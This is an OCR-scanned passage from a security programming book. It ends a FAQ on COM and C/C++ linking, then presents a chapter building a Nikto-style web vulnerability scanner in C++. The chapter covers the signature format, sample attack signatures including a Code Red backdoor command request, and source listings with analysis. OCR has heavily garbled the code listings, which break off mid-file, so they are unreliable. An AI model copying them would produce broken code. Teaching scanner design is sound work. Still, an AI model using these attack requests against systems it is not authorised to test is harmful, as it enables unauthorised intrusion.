A: The attribute [moduk(exe)J instructs the compiler to instrument the appropriate 
COM registration code. However, the registration provided is not entirely sufficient 
for the tool's needs. This is because the tool must be capable of distinguishing 
between whether or not it is started as a component, or as the original security tool. 
The means of determining this is by gleaning the command line. If the command-
line switch "-COMSERVER" is specified, the tool goes into COM mode. If it is 
omitted, it goes into security tool mode. The RegisterServer function appends to a 
string in the Registry which instructs the COM runtime to launch it with the 
command-line switch "-COMSERVER". 
Q; I added COM extensions to an application written in C. But when I compile it, I 
get an error stating that the application integration routines I wrote cannot be found 
by the linker. The error looks like this: error LNK2019: unresolved external symbol 
_NextRecord referenced in function _try_protocol. What's going on? 

592 
Chapter 13 • Writing Security Components 
k 
A: This is a very common issue when compiling code written in both C and C++. 
When code is written in C++ and compiled into its object form, the linker adds a 
special naming convention to the names of functions and variables known as name 
mangling. When C code is linked, it also uses a different object naming convention. 
Therefore, both languages need to agree upon a specific way of naming particular 
items in the object code. 
This is where the "extern "C" {" construct comes in. Place this construct 
around the functions in your C++ code, which will be accessed by code written in 
C, and the linker will be able to match up the reference with the implementation. 
An example of doing this includes the following: 
e x t e r n "C 
{ 
BOOL g_IsCOM; 
v o i d S e t m t e r f a c e i E [ c h a r *piFaceiD) 
{} 
) 
www.syngress.com 

Chapter 14 
Creating a Web 
Security Tool 
Solutions in this Chapter 
• 
Design 
Signatures 
• 
In-Depth Analysis 
• 
Tool Output 
Related Chapters: Chapter 4, Chapter 10, Chapter 
11, Chapter 12, Chapter 13 
El Summary 
0 Solutions Fast Track 
El Frequently Asked Questions 
593 
<
\ 

594 
Chapter 14 * Creating a Web Security Tool 
Introduction 
The launch of the World Wide Web has elevated the possibilities and expectations of 
communications to new heights. With Web servers, chat applications, peer-to-peer file 
transfer programs, and various other Web-enabled projects has changed our world. But 
with the arrival of these new technologies come security implications involving user 
privacy, data storage, and user integrity that incorporate authentication controls and 
encryption standards, to mention but two. Web servers, applications, sites, and data (obvi-
ously the most popular and oft-used part of the Internet) are the biggest concern of 
most security practitioners. 
Whisker, a complex Perl script written to assess Web-based vulnerabilities, was the 
de facto standard for Web application tools for nearly three years. Rain Forest Puppy 
(RFP) wrote Whisker to fulfill the need for a comprehensive tool that searched through 
Web server indexes looking for potentially vulnerable applications or injection points to 
launch an attack. RFP then started a new project entitled LibWhisker, which encom-
passed most of the functionality required to run the advanced queries within Whisker. 
LibWhisker soon became the backend technology that drove the development of nearly 
all Web assessment tools with the clear winner of freeware static scanners being CIRT's 
Nikto. Nikto has a Perl front-end that utilizes the LibWhisker modules for complex 
back-end functions. In addition to the front-end, Nikto had a new custom text database 
that encompassed a great deal of attack requests, potentially vulnerable CGI applications, 
and Web server banner identification techniques. 
Our Web server scanner, SP-Rebel, has a new parsing engine to read and interpret the 
data contained within the vulnerability database. In addition to the parsing engine, it also 
has a "packet cannon" that sends all the appropriate attack strings to the target systems. 
This chapter will detail the intricacies of designing this program, the code required to exe-
cute it, implementation issues, and the major components that are frequently utilized in 
command-line programs, which will put all our teaching and learning to the test. 
Design 
The most critical aspect of developing any software application or program is to first 
properly design the application. Creating the application is no trivial task and should be 
given careful consideration during its design. 
Attack Signature Format 
Nearly all flexible security scanning programs these days have fingerprint files that get 
"sucked" up, or parsed, and utilized. These fingerprint files add a level of flexibility since 
they allow for the easy creation of new fingerprints without adding new parsing or exe-
cution code, which is usually the more difficult of the two codes to write. These finger-
print files are commonly referred to as fingerprint databases, but in reality they are 
nothing more than text-based databases. The data records follow a common format and 
in general need to be parsed for proper execution. 

Creating a Web Security Tool • Chapter 14 
595 
The application we have created utilizes a publicly available and extremely popular 
vulnerability signature database from the U.S. Department of Energy's CIRT (computer 
incident response team).The Nikto vulnerability database has contributors from across 
the globe, but more importantly, each signature has a common format.The following is 
the format for the vulnerability signatures included within the database, which we will 
parse thro ugh out our program. 
Checks; ws type, root, response,method,http,auditorial output 
The first parameter in the vulnerability signature is reserved for the type of vulnera-
bility that the signature analyzes, while the second informs the program of the directory, 
file, and/or attack string that should be sent to the target Web server. The response 
parameter is the HTTP code that is the desired response from a vulnerable system 
(examples include 200 Ok, 502 Bad Gateway, and 302 Moved Temporarily).The method 
parameter defines the HTTP method by which to transmit the method to the remote 
system. In nearly all cases, you will use GET or POST; albeit TRACE is a new favorite 
in the security industry. The last parameter can be used as additional output that could 
be included within a report or merely used for commenting purposes. 
Signatures 
Now that the attack signature format has been covered, let's focus on attack signatures. 
• 
Htaccess Example Fingerprint 
"generic","/.htaaess","200" ,"GET","Contains authorization information" 
• 
IIS w3proxy.dll 
"iis"l"/scripts/proxy/w3proxydtl","502","GET"1"MSProxy t>1.0 installed" 
• 
Code Red Infection on the Target System 
"lis"," /scripts/root. exe?/c+dir+c:\+/OG ","Directory of C"," GET"," This machine 
is infected with Code Red, or lias Code Red leftovers." 
In-Depth Analysis 
After exploring the attack signatures, the next logical step is to implement a means to 
apply signature tests in a more large-scale and organized fashion.To do this efficiently, 
the creation of a Web hacking tool is required, without which we would have to resort 
to manual discovery and verification of each possible vulnerability and path combina-
tion. The solution is SP-Rebel, a simple C/C++ program written in a relatively short 
time frame that can perform multiple database signature tests.The program is composed 
of four major parts, each necessary in accomplishing this goal: 
• 
Connection management 
• 
Signature analysis 
• 
Vulnerability storage 
• 
"Packet cannon" 

596 
Chapter 14 * Creating a Web Security Tool 
In essence, these four pieces identify what needs to be sent as a test, perform the 
test, and then analyze the results. To interpret the database and identity tests to perform 
on the classes, ViilnDBEntry (signature analysis) and VuluDB (vulnerability storage) were 
Created.To initiate testing, Windows socket functions were written (connection manage-
ment) for use within main ("packet cannon"). 
Sockets and Execution 
The sp-rebel.cpp file contains both the connection management and the "packet 
cannon" portions of this program. Here connection management functions are defined 
to handle requests to the Web server for specific Web signatures that would suggest vul-
nerability. mainQ interprets arguments passed to the program for hostname, port, output, 
and buffer. The connection management functions are then called and the results are 
analyzed to determine vulnerabilities. 
SY N £ H f 5 5 
1 
2 
3 
4 
5 
6 
7 
3 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
34 
35 
36 
37 
38 
39 
40 
* sp-rebel.cpp 
* 
* james c. 
f o s t e r jamescfoster@gjnail 
* inike p r i c e <mike@in5i.diae.org:> 
* torn f. e r r is < tommy @security-pro toco 
* 
kevin h a r r i f o r d -ckharrifo@csc.com> 
*/ 
tdefine WIN32_LEAN_AND_MEAN 
# i n c l u d e 
<winsock2.h> 
^ i n c l u d e <w indows.h> 
t f i n c l u d e i s t d i o . h > 
tfinclude 
"VulnDB.h" 
ttpragma comment{lib, 
pws2_32.1ibM 
tfdenne DB_FILENAME 
M scan_database.db* 
tfdefine BUF_SIZE 
0x0400 
tfdefine DEF_PORT 
SO 
i n t output = 0; 
f* 
* l i s t of CGIDIRS 
*/ 
tfdefine CGIDIRS_LEN 
0x02 
s t r i n g CGIDIRS[CGIDIRS_LBN] 
= 
[ 
V c g i - b i n / " , 
* / s c r i p t s / " 
/* add more CGI d i r s here */ 
/* 
* l i s t of ADMIWDIRS 
*/ 

Creating a Web Security Tool • Chapter 14 
597 
41 
42 
43 
4 4 
45 
46 
47 
48 
49 
50 
51 
52 
53 
54 
55 
56 
57 
58 
59 
60 
61 
62 
63 
64 
65 
66 
67 
68 
69 
70 
71 
72 
73 
74 
75 
76 
77 
78 
79 
80 
81 
82 
83 
84 
85 
86 
87 
88 
89 
90 
91 
92 
93 
94 
95 
#deiine ADMIHDIRS_LEN 
0x01 
S t r i n g AEMINDIRS [ ADMINEIRS_LEN] = 
{ 
i; 
/* 
"/admin/" 
/* add more admin d i r s h e r e V 
* t w i d d l e d 
* 
* 
*/ 
void 
{ 
;• 
f* 
twiddle 
( i n t 
kpos, 
i n t 
i d x , 
i n t 
s i z e ) 
c h a r ch = 0; 
ch = (pos == 0 ? ' [ ' 
: 
(pos == 1 ? ' / ' 
: 
{pos == 2 ? ' - " 
: 
•\\'))>; 
++pos; 
i f { p o s == 4} 
{ 
pos = 0; 
} 
p r i n t f ( " \ r % c %d of %d", 
ch, 
idx, 
s i z e ) ; 
* i s v u l n ( ) 
-
• 
- . • 
void 
{ 
:• 
,
•
•
' 
i s v u l n 
(char *hostname, 
i n t p o r t , 
VulnDBEntry *vdbe) 
" 
V f f l 
p r i n t E \ 
— — \ v\ it * \ • 
——————\T\a 
j , 
p r i n t f ( " \ r \ n H O S T : %s @ %d\r\n\r\nDESCRIPTION:\r\n\r\n%s.\r\n*, host 
vdbe-XJetDesc () . c _ s t r () ) ; 
* d o r e q O 
« 
* 
bool doreq ( 
char 
*hostname, 
unsigned i n t 
addr, 
i n t 
p o r t , 
VulnDBEntry *vclbe, 
i n t 
b u f s i z e , 
name, 
p o r t , 

598 
Chapter 14 * Creating a Web Security Tool 
96 
97 
98 
99 
100 
101 
102 
103 
104 
105 
106 
107 
108 
109 
110 
111 
112 
113 
114 
115 
116 
117 
118 
119 
120 
121 
122 
123 
124 
125 
126 
127 
128 
129 
130 
131 
132 
133 
134 
135 
136 
137 
138 
139 
140 
141 
142 
143 
144 
145 
146 
147 
148 
string 
kreq) 
Struct SoCkaddr_in sin; 
SOCKET sock = 0; 
bool 
vuln = false; 
char *buf = NULL; 
int 
ret 
= Q; 
buf = new char[bufsize] ; 
if(buf == NULL) 
{ 
printf("\r\n*** memory allocation error (new char[%d] failed)Ar\n", 
bufsize); 
return(false); 
> 
SOck = SOCket(AF_INET, SQCK_STREAM, G ) ; 
if(SOCk < 0) 
{ 
delete buf; 
printf("\r\n*** error connecting to target for this request (socket() 
failed).\r\n'}j 
return(faLse)i 
} 
memset(&sin, 0x0, sizeof(sin)); 
sinTsin_family 
= AF_INET; 
sinTsin_port 
= htons(port); 
sinTsin_addrTs_addr = addr; 
// connect to remote TCP port 
ret = connect(sock, (struct sockaddr 
if(ret < 0) 
:) &sinF sizeof(sin)); 
( 
delete buf; 
printf("\r\n*** error connecting to target for this request (connect() 
failed).\r\n*); 
closesocket(sock); 
return(false); 
I/ connected.. 
J/ send request 
ret = send(sock, req,c_str(), reqTlength(), 0 ) ; 
if(ret !• req.length!)) 
{ 
delete buf; 
printf("\r\n*** error sending data to target for this request {send() 
failed).\r\n~); 
closesocket(sock) ; 
return(false) ; 
} 
// receive response 
ret = recv(sock, buf, bufsize, 0); 
if(ret <= 0) 

Creating a Web Security Tool • Chapter 14 
599 
149 
{ 
150 
delete buf; 
151 
printf("\r\n*** error receiving data from target for this request (recv(} 
nothing received).\r\n") ; 
152 
closesocket(sock); 
153 
return(false) ; 
154 
} 
155 
1 56 
closesocket(sock); 
157 
158 
buttret - 1] = ' \ 0 ' ; 
159 
160 
// is 200 OK check? 
161 
if(!strcmp(vdbe->GetResult0.c_strO, 
"200"!) 
162 
{ 
163 
if(strstrlbuf, "200 OK") 
!= NULL) 
164 
{ 
165 
vuln = true; 
166 
} 
167 
> 
168 
else 
169 
{ 
170 
if[strstrlbuf, vdbe->GetResult(),c_str{)) 
!= NULL) 
171 
{ 
172 
vuln • true; 
173 
} 
174 
> 
175 
176 
if (vuln) 
177 
{ 
178 
if (output ==1) 
179 
{ 
180 
printf("\r\n\r\n*** VULNERABLE.\r\n\r\n"); 
1 81 
printf("REQUEST :\r\n\r\n%s\r\n", req.c_str()); 
182 
printf("RESPONSE:\r\n\r\n%s\r\n", 
buf); 
183 
) 
184 
else 
185 
< 
1 8 6 
printf("TARGET: %S B %<S, SUCCESSFUL ATTACK REQUEST : %s" , hostname, 
port, 
req.c_str()); 
187 
} 
188 
189 
delete buf; 
190 
return(true) j 
191 
} 
192 
193 
delete buf; 
194 
1 95 
return(false); 
196 } 
197 
198 , -
199 
* check!) 
200 
* 
201 
-
202 
*/ 
203 bool check ( 
char 
* hostname H 

600 
Chapter 14 * Creating a Web Security Tool 
204 
unsigned i n t 
addr, 
2 0 5 
i n t 
p o r t , 
2 0 6 
VulnEBEntry 
*vdbe, 
207 
i n t 
bufsize} 
208 ; 
209 
s t r i n g : : s i z e _ t y p e 
posx; 
2 1 0 
s t r i n g c g i d i r s = "9CGIDIRS"; 
211 
s t r i n g adindirs = "§ADMINDIRS*; 
2 1 2 
s t r i n g 
req; 
213 
string path; 
214 
string tl = "; 
2 1 5 
bool 
docgi 
= f a l s e ; 
2 1 6 
bool 
doadm 
= f a l s e ; 
2 1 7 
bool 
r e t 
= f a l s e ; 
2 1 8 
i n t 
cnt 
• 1 ; 
2 1 9 
i n t 
idx 
- 0; 
220 
2 2 1 
// 
check 
for &CGIDIRS 
2 2 2 
posx 
= vdbe-^GetPatht) ^fLndJcgidirsl ; 
223 
i f ( p o s x 
!= s t r i n g : : n p o s ) 
224 
( 
2 2 5 
docgi = t r u e ; 
2 2 6 
cnt 
= CGIDIRS_LEN; 
227 
} 
228 
else 
229 
( 
2 3 0 
// 
check 
for SADMINDIRS 
231 
posx = vdbe-:>GetPath() .find (admdirs) ; 
232 
i f ( p o s x 
!= s t r i n g ; ; n p o s ) 
233 
{ 
234 
doadm = t r u e ; 
2 3 5 
cut 
= ADMINDIRS_LEN; 
236 
} 
237 
} 
238 
2 3 9 
for{idx=0; idx < c n t ; ++idxl 
2 4 0 
f 
241 
i f ( d o c g i ) 
2 4 2 
{ 
243 
iflposx i oi 
244 
{ 
2 4 5 
tl = vdbe->GetPath() . s u b s t r ( 0 , 
posx) ; 
2 4 6 
) 
2 4 7 
2 4 8 
p a t h = tl + CGIEIRSIidx] + v d b e - > G e t P a t h ( ) , s u b s t r ( p o s x + 
c g i d i r s . l e n g t h ! ) , 
v d b e - > G e t P a t h ( ) . l e n g t h ( ) 
- c g i d i r s . l e n g t h ! ) ) ; 
249 
} 
250 
e l s e 
if(doadm) 
251 
( 
2 5 2 
i f l p o s x > 0) 
2 5 3 
{ 
2 5 4 
t l = v d b e - > G e t P a t h [ ) . s u b s t r ( 0 , 
p o s x ) ; 
2 5 5 
> 
2 5 6 
2 5 7 
p a t h = ti + ADMiNDiRS[idx] + vdbe-i<3etPath() ,substr(posK + 
a d m d i r s . l e n g t h ( ) H 
v d b e - > G e t P a t h ( } . l e n g t h { ) 
- a d m d i r s . l e n g t h ( ) ) j 
258 
} 

Creating a Web Security Tool • Chapter 14 
259 
else 
260 
{ 
261 
path = vdbe->GetPath() ; 
262 
} 
263 
264 
// build HTTP 1.0 request 
265 
req = vdbe->GetMethod() 
266 
+ • • 
267 
+ path 
268 
+ " HTTP/1.0\r\n\r\n"; 
269 
270 
ret = doreq(hostname, addr, port, vdbe, bufsize, req); 
271 
if(ret == true) 
272 
{ 
273 
return(true); 
274 
} 
275 
} 
276 
277 
return(false); 
278 } 
279 
280/* 
281 
* resolveO 
282 
* 
283 * 
284 
v 
285 bool resolve ( 
char *hostname, 
286 
unsigned int 
*addr) 
287 { 
288 
struct hostent *he = NULL; 
289 
290 
*addr = inet_addr(hostname) ; 
291 
if(*addr == INADDR_NONE) 
292 
{ 
293 
he = gethostbyname(hostname); 
294 
if [he == HULL) 
295 
< 
296 
return(false); 
297 
} 
298 
299 
memcpy(addr, he->h_addr, he->h_length); 
300 
> 
301 
302 
return (true) ; 
303 > 
304 
305 /* 
306 
* usage() 
307 
* 
308 
* 
309 
v 
310 void usage () 
311 ( 
312 
printf("Webserver Scanner by the Author's of Advanced Security Programming: 
Price, Foster, and Tommy \r\n"); 
313 
printf(nWe use CIRT's awesome and freely available VulnDB! \ r \ n \ r \ n * ) ; 
314 
printf("Usage: sprebel.exe hostname <port> <0|1> <bufsize>\r\n*); 

602 
Chapter 14 * Creating a Web Security Tool 
315 
printf ( "-IOS = Default, Minimal Output\r\n") ; 
316 
printf ("<1> ~ Verbose Output - show me the request and response buf fer\r\n"} ^ 
317 } 
318 
319 int 
320 main(int argc, char *argv[]) 
321 { 
322 
unsigned int addr 
= 0; 
323 
VulnCBEntry *vdbe 
= NULL? 
324 
WSADATA 
wsa; 
325 
VulnDB 
vdb; 
326 
bool 
ret 
= false; 
327 
int 
bufsiie = 0; 
328 
int 
port 
= 0; 
329 
int 
pos 
= 0; 
330 
int 
x 
= 0; 
331 
332 
memset(&wsaH 0x0, sizeofIWSADATA)); 
333 
if(wSAStartup(MAKEWORD(l,1), kwsa) != 0) 
334 
{ 
335 
printf("\r\n*** error initializing WSA (WSAStartup(J failed: %d).\r\n", 
GetLastErrorI)J; 
336 
r e t u r n l l ) ; 
337 
} 
338 
339 
// process user args 
340 
iflargc < 31 
341 
{ 
342 
usage () ; 
343 
r e t u r n l l ) ; 
344 
} 
345 
346 
ret = resolvelargv[l], saddr); 
347 
i f ( r e t != true) 
348 
{ 
349 
printfC\r\n*** error resolving hostname (resolve() 
failedK\r\n*) ; 
350 
return(l) ; 
351 
} 
352 
353 
port = DEF_PORT; 
354 
if(argc >= 3) 
355 
{ 
356 
port = atoi(argv[2J}; 
357 
} 
358 
359 
if(argc >=4) 
360 
{ 
361 
output = atoi(argv[3]) ; 
362 
} 
363 
364 
bufsiie 
= BUF_SIZE; 
365 
if large >= 5] 
366 
i 
367 
bufsize = atoi{argv[4]); 
368 
} 
369 
370 
printf{"using host/addr: %s; port: %d; output: %d; bufsize: %d;\r\n"r argu[1], 

Creating a Web Security Tool * Chapter 14 
603 
port, output, bufsize); 
371 
372 
// 
load vuln database 
373 
ret = vdo.lrtit (DE_FILENAME) ; 
374 
i f ( r e t == false) 
375 
t 
376 
printf("\r\n*** 
error 
i n i t i a l i s i n g 
vulnerability database 
(VulnDB.Init(%s) 
failed!.\r\n", 
DB_FILENAMEI; 
377 
return(1) ; 
378 
> 
379 
380 
// check for each entry 
381 
for(x=0; y. < vdb.SizeO; ++x) 
382 
{ 
383 
vdbe = vdb.GetEntry(x); 
384 
385 
ret = check(argv(l], 
addr, 
port, 
vdbe, 
bufsize); 
386 
if(ret == true fcS output == 1) 
387 
{ 
388 
isvuln(argv[l] , 
port, 
vdbe); 
389 
) 
390 
391 
iffoutput == 1) 
392 
{ 
393 
twiddle(pos, 
x, 
vdb.Sized); 
394 
} 
395 
> 
396 
397 
printf("\r\n SCAN COMPLETED - SHAMLESS PLUG - GO BUY ADVAHCED SECURITY 
PROGRAMMING!\r\n"l; 
398 
399 
WSACleanupl) : 
400 
401 
return(O) ; 
402 } 
Analysis 
At lines 12 through 17, libraries to be used by the program during the build process are 
included. These libraries include various socket headers and the vulnerability handling 
database class, VulnDB. 
At line 19, DB_FILENAME is defined. This static variable is designed to direct the 
program at the vulnerability database file. Since we are using CIRT's VulnDB file, the 
default is scan_databasc.db. 
At lines 20 through 2?> default values are assigned to the function arguments. 
Hostname is the only argument that must be assigned in the scan. 
At lines 28 through 36, the CGIDIRS variables are defined. CCIDIRS_LEN assigns 
the number of cgi directories being assigned to the CGIOIl<.S|] array. CGIDIRS is 
simply a string array which carries string paths for various cgi directories.The current 
list is extremely minimal. 
At lines 28 through 48, the ADMINDIRS variables are defined. This set of variables 
is similar in function to the (XUDIRS. 

604 
Chapter 14 * Creating a Web Security Tool 
At lines 55 through 73, the function twiddle is defined. This function provides a 
status based on the index and number of entries in the database for the user to gauge 
progress when running the tool with output flag set to 1. 
At lines 76 through 84, the isvuln function is declared.This function is only used 
when the vulnerability is determined to exist on the target.The function prints the 
hostname port and description of the vulnerability. 
At lines 86 through 196, doreq() is defined.This function is used to manage the 
connection and transmission of a vulnerability request. Lines 98 through 156 deal with 
the creation and usage of a socket to perform the test on a server. A more detailed dis-
cussion of sockets and how they work can be found in Section 2: Sockets. For now, the 
main idea is to understand that an error is printed to S T D O U T if the connection fails, 
in addition to the function returning false. 
Once the connection is established and a successful test is performed, the results are 
analyzed to determine if the vulnerability exists. In this case, a simple check for a 200 
OK or vulnerability db specified response is performed in lines 161 through 191. 
At lines 198 through 278, the chcckQ function is defined. This function is designed 
to look at the path of a vulnerability and interpret whether or not it needs to use the 
variables CCIDIRS or ADMINDIRS. If neither of the D I R prefixes is required, the 
path is directly added to the request being sent to the doreqfj function. 
Examining lines 221 through 227, the test for (X1ID1RS is determined by a string 
find for the cgidir string in the vulnerability path. If it is found, the docgi flag is set and 
tests are performed at lines 239 through 275 for all cgi directories defined, or until one 
of the directories returns a success. Similar tests are performed for ADMINDIRS if 
CGIDIRS is not found. 
At lines 280 through 303, the resolve function is defined; this function simply resolves 
an IP address from a hostname passed as a parameter.The addr parameter is populated with 
the resulting IP and the function returns true if it was successful in translation. 
At lines 305 through 317, the usage function is defined.The usage function is called 
when insufficient parameters are used with the program. This function siniply prints the 
program usage to the screen. 
The main function begins at line 320. This function is the core of the tool. Here the 
organization and logic of the scanner is implemented. 
At lines 332 and 333, the Web Services Addressing struct is filled with zeroes to pre-
vent unintentional socket calls. WSAStartup initializes the ws2.dll. If the initialization 
fails, error messages are printed and the program returns code 1. 
At lines 339 through 370, program arguments are handled. Line 340 checks for 
arguments and correct usage of the program. If insufficient arguments are passed, the 
program returns usage. Line 346 resolves any hostnames passed into the program or 
translates IPs into the correct format. At line 353, port details are specified, taking the 
default port of 80 if no port is specified in the parameters. The same is performed with 
buffer size and output settings. Before continuing, the selected settings are printed for 
the user. 
At line 373, the vulnerability database is populated with information contained in 
DB_FILENAME 
(by 
default 
scan_database.db). 

Creating a Web Security Tool • Chapter 14 
605 
In lines 380 through 395, a for loop is used to control the testing of each of the vul-
nerabilities in the database using the check function. If the check returns positive and 
the output flag is set, isvulnQ is called to print vulnerability information, along with a 
status of the testing progress. 
At line 397, a shameless plug is incorporated to signal the user of scan completion. 
At line 399, WSACleanup is called to clear the Web Service Addressing followed by 
return (> to exit the program without error codes. 
Parsing 
Understanding the processes required in performing a scan by implementing data calls 
and testing methods is critical to understanding the development of a Web hacking tool; 
however, the tool cannot be implemented without a means of parsing the data to be 
passed through signature interpreters. To overcome this obstacle, we implemented the 
VtibiDB and ViihiDBEntry classes. 
Each of these is responsible for breaking down our database file into smaller more 
manageable chunks. The VuliiDB class reads the file, strips out extra whitespace at the 
beginning and end of each line, strips out comment lines, and then passes the remaining 
lines onto the VuhiDBEutry class. 
5 •<• N (, ft E i i 
^a 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 
33 
!* 
* VulnDB.cpp 
* 
* 
*/ 
# i n c l u d e <windows. h> 
# i n c l u d e 
< s t d i o . h > 
((include 
"VulnDB.h" 
#define VULNDB_BOF_SIZE 
0x0400 
#define VULNDB_COMMEHT 
' # ' 
t* 
* 
s t r t r i m O 
* 
* 
*f 
s t a t i c 
c h a r *stz"trim(char *sin H 
char * 
{ 
i n t len 
= 0; 
i n t idxl = 0; 
i n t i d x t = 0: 
len 
= s t r l e n ( s i n ) ; 
s o u t [ 0 ] 
= 
-\Q-; 
i f ( l e n <= 0) 
{ 
r e t u r n ( s o u t ) ; 
} 
sout) 

606 
Chapter 14 * Creating a Web Security Tool 
34 
35 
36 
37 
38 
39 
40 
41 
42 
43 
44 
45 
46 
47 
48 
49 
50 
51 
52 
53 
54 
55 
56 
57 
58 
59 
60 
61 
62 
63 
64 
65 
66 
67 
68 
69 
70 
71 
72 
73 
74 
75 
76 
77 
78 
79 
SO 
81 
82 
83 
84 
85 
86 
87 
88 
89 
90 
} 
* 
• 
* 
• ' • 
/ / 
leading 
f o r ( i d x l = 0 ; 
i d x l < len; 
++idxl) 
{ 
i f ( s i n t i d x l l 
!= • 
• 
s i n [ i d x l ] 
1= • \ t ' 
s i n t i d x l ] 
1= ' \ r ' 
g i n [ i d x l ] 
! = ' \ n ' 
( 
break; 
} 
} 
/ / 
t r a i l i n g 
f o r ( i d x t = l e n - 1; 
i d x t >= 
{ 
i f ( s i n [ i d x t ] 
!= ' 
' 
s i n ( i d x t ] 
1= ' \ t 
s i n [ i d x t ] 
!= 'Xr1 
s i n [ i d x t ] 
1= ' \ n ' 
{ 
break? 
} 
) 
/ / 
a l l white space 
i f ( i d x l == len] 
{ 
r e t u r n t s o u t ) ; 
) 
/ / 
copy 
l e n = i d x t - idxl 4- 1; 
s t r n c p y ( s o u t , 
s i n + i d x l , 
soucllen] = •\0"; 
r e t u r n ( s o u t ) ; 
VulnDB() 
V u l n D B ; : V u l n D B ( ) 
( 
} 
/* 
* 
• 
* 
*/ 
Vul: 
{ 
-VulnDB() 
nDB::-VulnDB!) 
VulnDBEntry *vde = NULL; 
i n t 
idx • 0; 
&& 
&& 
&& 
) 
0; 
--
:,..-. 
fc& 
k& 
) 
len) ; 

Creating a Web Security Tool • Chapter 14 
91 
92 
fQr(idx^t); icLx < m_vec. s i z e O J ++icbc) 
9 3 
i 
94 
vde 
= m_vec[idx]; 
9 5 
d e l e t e vde; 
96 
m_vec(idx) = NULL; 
9 7 
} 
9 8 
9 9 
m _ v e c . c l e a r ( ) ; 
100 ) 
101 
102/* 
1 0 3 
* I n i t O 
1 0 4 
-
105 * 
1 0 6 
*/ 
1 07 bool V u l n D B : : I n i t ( s t r i n g filename) 
1 0 8 { 
109 
VulnDBEntry *vdbe = NULL; 
110 
FILE 
*fptr = NULL; 
1 1 1 
char 
tmp[VULNDB_BUF_SIZE] ; 
1 1 2 
char 
bu£ [VULNDB_BUF_SIZE] ; 
1 13 
bool 
r e t 
= 0; 
1 1 4 
1 1 5 
f p t r = fopert(filename.c_str () , 
- r ~ } ; 
1 1 6 
if ( f p t r == NULL) 
117 
{ 
118 
1 1 9 
} 
1 2 0 
121 
// 
for 
each non-comment 
l i n e 
in file, 
1 2 2 
/ / 
p a r s e 
123 
// store in list node 
124 
// store in list 
125 
1 2 6 
i n t x =0; 
1 2 7 
1 2 8 
while [fgets(tmp, 
VULHDB_BUF_SIZE, 
f p t r ) 
!= NULL) 
1 2 9 
{ 
1 30 
s t r t r i m f t m p , 
b u t J ; 
131 
1 3 2 
i f ( s t r l e n ( b u f ) == 0 | | 
1 3 3 
buf[0) 
== VULNDB_COMMENT) 
134 
{ 
1 3 5 
c o n t i n u e ; 
1 3 6 
} 
1 3 7 
1 3 8 
vdbe = new VulnDBEntry() ; 
1 3 9 
if (vdbe == NULL! 
140 
{ 
141 
f c l o s e f f p t r ) i 
1 4 2 
r e t u r n ( f a l s e ) ; 
143 
} 
144 
1 4 5 
ret = v d b e - > I n i t I b u f ) ; 
1 4 6 
i f ( r e t 
! = true) 
147 
{ 

608 
Chapter 14 * Creating a Web Security Tool 
148 
fclose(fptr) ; 
1 4 9 
r e t u r n ( f a l s e ) ; 
150 
} 
151 
152 
m_vecTpush_bacMvdbe) ; 
153 
} 
154 
155 
fclose(fptr) ; 
156 
1 57 
r e t u r n ( t r u e ) ; 
158 } 
159 
160/* 
161 
* Sized 
162 * 
163 
• 
164 
v 
1 6 5 i n t VulnDB: :Siz«() 
166 { 
167 
return(m_vec Tsize()}; 
168 } 
169 
1 7 0 / * 
171 
* GetEntryO 
172 * 
173 * 
174 */ 
175 VulnDBEntry *VulnDB: :GetEntry(int idx) 
176 { 
177 
VulnDBEntry *vde = MULL; 
178 
179 
if (idx < 0 | | 
180 
idx > (m_vec.size{) - lj ) 
181 
{ 
182 
return(NULL) ; 
183 
} 
184 
185 
vde = m_vec [idx] ; 
186 
187 
return (vde) ; 
188 } 
Analysis 
At lines 15 through 71, the non-member function strtrini is defined.This function is 
used to strip away whitespace from the beginning and end of a string. A new string is 
created inside the function and set to empty at lines 27 and 28.This string will be 
returned once the whitespace has been removed and the remaining contents of the orig-
inal string are copied over to the new string. 
At lines 36 through 45, an index is moved to the first non-whitespace character in the 
string; a similar index is created for the trailing character in lines 48 through 57. If the 
leading index encompasses the entire string, the function will return an empty string. 

Creating a Web Security Tool • Chapter 14 
609 
At lines 65 through 70, the non-whitespace leading and ending string is copied over 
to the new string and returned by the function if the function has not already exited 
due to a blank line. 
At lines 73 through 80, the Default constructor for this class is defined.This instance 
of the constructor should assign values and initialize members due to the use of dynamic 
memory, otherwise memory errors may occur.This is likely to happen in more complex 
implementations and will not be addressed here. Also notice the fact that the assignment 
operator is not implemented. Since we are using only one database, we are not concerned 
with this operator. If a more complex implementation is being written which will use 
multiple databases, the assignment operator should be defined. Please refer to a C + + 
resource book to understand the importance of constructors, assignments, and destructors. 
At lines 82 through 100, the destructor is defined. The destructor traverses the vector 
and deletes each of its nodes to prevent memory leaks that can be caused by unmanaged 
object destruction. If the object is destroyed without first freeing the dynamic memory in 
the data members, it results in the allocated memory not being freed. 
In lines 102 through 158, the key parsing elements of the VulnDB class are 
implemented. 
At line 115, the file is opened and read to the file descriptor fptr.This descriptor is 
used by a while loop at line 128 to continually pull lines from the file to be further 
parsed. 
At line 130, strtrim is called to remove leading and trailing whitespace. If the line 
turns out to be a comment (lines 132 and 133), no further processing of the line is done 
and we continue on to the next line by calling continue at line 135. 
At line 138, a new VulnDBEntry is created and the line buffer is transferred to be 
parsed within the VulnDBEntry class. Once this is complete, the new entry is pushed on 
to the m_vuln vector and loop proceeds on until there are no more lines to parse. 
Assuming no errors occurred which caused an initialization return, the file is closed 
and the initialization function returns true. 
At lines 161 through 168, the Size method is defined. This method returns the size 
of the VulnDBEntry vector giving us the ability to determine the number of elements in 
the vector. 
At lines 175 through 188, the GetEutry method is defined.This returns a pointer to 
the VulnDBEntry contained at the index idx in the m_vec vector as long as the index 
does not fall outside of the vector's data range. 
The VnlitDBEntry class uses several tokens to parse out each line into comprehensive 
Type, Path, Result, Method, and Description.This information will be stored and used 
by the tool as instructions for each of the vulnerabilities. As previously mentioned, this 
class receives input from VuliiDB to perform further parsing. I'nlnDB contains a vector 
that stores each VulnDBEntry generated, 
2 
* VulnDBEntry.epp 
4 
' 
5 
* 
6 
•/ 

610 
Chapter 14 * Creating a Web Security Tool 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
